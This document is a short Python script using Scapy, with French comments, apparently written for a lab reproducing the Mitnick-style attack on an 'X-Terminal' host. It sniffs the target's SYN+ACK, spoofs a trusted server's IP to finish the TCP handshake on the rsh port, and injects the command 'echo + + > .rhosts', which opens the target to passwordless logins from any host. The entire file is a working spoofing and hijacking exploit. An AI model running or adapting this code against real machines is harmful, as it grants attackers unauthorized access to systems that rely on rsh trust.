#!/usr/bin/python3
from scapy.all import *

x_ip     = "10.99.46.189"
x_port   = 514
srv_ip   = "10.99.46.51"
srv_port = 1023
seq_num  = 0x1000 + 1

def spoof(pkt):
    global seq_num
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
    print("{}:{} -> {}:{} Flags={} Len={}".format(
        old_ip.src, old_tcp.sport,
        old_ip.dst, old_tcp.dport,
        old_tcp.flags, tcp_len))

    # Répondre au SYN+ACK
    if old_tcp.flags == "SA":
        ack_num = old_tcp.seq + 1

        ip = IP(src=srv_ip, dst=x_ip)

        # ACK pour compléter le handshake
        tcp_ack = TCP(sport=srv_port, dport=x_port,
                      flags="A",
                      seq=seq_num,
                      ack=ack_num)
        send(ip/tcp_ack, verbose=0)
        print("[+] ACK envoyé -> handshake terminé")

        # RSH data
        rsh_data = b'9090\x00mahmoud\x00mahmoud\x00echo + + > .rhosts\x00'
        tcp_data = TCP(sport=srv_port, dport=x_port,
                       flags="PA",  # PSH+ACK
                       seq=seq_num,
                       ack=ack_num)
        send(ip/tcp_data/rsh_data, verbose=0)
        print("[+] RSH data envoyé")
        seq_num += len(rsh_data)

# Sniff SYN+ACK venant de X-Terminal
myFilter = 'tcp and src host 10.99.46.189 and dst host 10.99.46.51 and src port 514'
print("[*] Sniffing en attente du SYN+ACK...")
sniff(filter=myFilter, prn=spoof)